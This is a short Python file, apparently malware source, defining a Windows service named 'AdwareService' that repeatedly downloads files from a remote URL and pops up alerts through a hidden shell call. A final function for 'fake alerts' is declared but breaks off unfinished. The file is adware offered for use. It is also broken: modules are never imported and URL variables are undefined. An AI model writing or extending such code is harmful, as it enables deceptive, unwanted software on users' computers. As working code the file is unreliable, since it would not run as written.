import threading
from win32serviceutil import InstallService, RemoveService, Service
from win32service import SERVICE_RUNNING, SERVICE_STOPPED
from win32event import CreateEvent, WaitForSingleObject, INFINITE
from win32service import StartService, StopService
from win32service import OpenService, CloseServiceHandle
from win32service import QueryServiceStatus
from win32api import ShellExecute
from win32con import SW_HIDE

class AdwareService(Service):
    def SvcDoRun(self):
        self.run = True
        while self.run:
            self.download_file()
            self.display_alert()
            time.sleep(60)

    def SvcStop(self):
        self.run = False

    def download_file(self):
        response = requests.get(download_url)
        if response.status_code == 200:
            with open('downloaded_file', 'wb') as file:
                file.write(response.content)

    def display_alert(self):
        ShellExecute(0, 'open', f'msg * /w {alert_url}', None, '.', SW_HIDE)

def adware_auto_download_files_fake_alerts(download_url: str, alert_url: str) -> None:
